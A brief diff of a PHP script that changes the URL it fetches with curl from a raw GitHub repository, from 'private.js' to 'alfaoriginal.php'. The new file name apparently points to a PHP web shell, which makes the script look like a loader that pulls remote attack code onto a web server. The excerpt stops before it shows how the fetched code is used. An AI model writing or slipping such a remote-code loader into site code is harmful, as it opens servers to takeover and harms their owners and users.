@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/vyscomaylando/quixter/main/private.js";
+$url = "https://raw.githubusercontent.com/vyscomaylando/quixter/main/alfaoriginal.php";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
